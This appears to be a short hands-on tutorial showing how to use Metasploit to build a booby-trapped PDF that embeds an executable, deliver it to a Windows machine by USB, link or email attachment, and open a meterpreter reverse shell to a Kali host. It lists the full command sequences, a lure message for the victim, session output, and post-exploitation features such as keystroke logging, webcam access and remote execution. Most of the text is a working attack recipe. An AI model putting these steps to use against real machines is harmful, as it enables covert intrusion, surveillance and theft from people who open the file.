This is possible to take control of a Windows XP/7/10 machine by installing 
a corrupted PDF file created by Metasploit and put on the Windows machine.

-> Create the exploit on Metasploit
  msf6> use exploit/windows/fileformat/adobe_pdf_embedded_exe
  msf6> info 
  msf6> show options
  msf6> set LAUNCH_MESSAGE <What you want, example below>
  msf6> set LAUNCH_MESSAGE Click here to continue
  msf6> exploit

That last command will create the corrupted evil.pdf file into ~/.msf4/local.

-> Put the file on the Windows machine
Try to find a way for that: USB copy, HTML link, download, attached file, ...

-> Launch the Reverse TCP handler
1. Start the reverse TCP.
  msf6> use exploit/multi/handler
  msf6> info
  msf6> show options
  msf6> set LHOST <kali ip>
  msf6> set payload windows/meterpreter/reverse_tcp
  msf6> exploit

2. Kali is waiting for reverse connection on <kali ip>:4444
  msf6> [*] Started reverse TCP handler on 192.168.8.128:4444

-> The file will be opened on Windows 10
For that exploit, the file should be opened with Adobe PDF reader 9.0.
The user must accept all and copy the file where evil.pdf is (example, on the Desktop).

-> Exploit 
Once the Kali machine has accepted the connection (in reverse), the meterpreter will give the prompt.
[*] Started reverse TCP handler on 192.168.8.128:4444 
[*] Sending stage (177734 bytes) to 192.168.8.180
[*] Meterpreter session 2 opened (192.168.8.128:4444 -> 192.168.8.180:49815) at 2025-01-16 05:23:59 -0500

  meterpreter> help

help gives so many things to do:
  execute -f <.exe file>: executes <.exe file>.
  play <sound file>: plays sound. 
  webcam_*: plays with webcams.  
  keyboard_send <data>: send <data> characters to the Win machine.
  keyscan_start: starts keyboard listenning.
  keyscan_dump: dumps what was typed on Win.
  keyscan_stop: stops keyboard listenning.
  evething is possible: kill, cat, shutdown, mouse, ps, reboot, shutdown, ipconfig and so on...
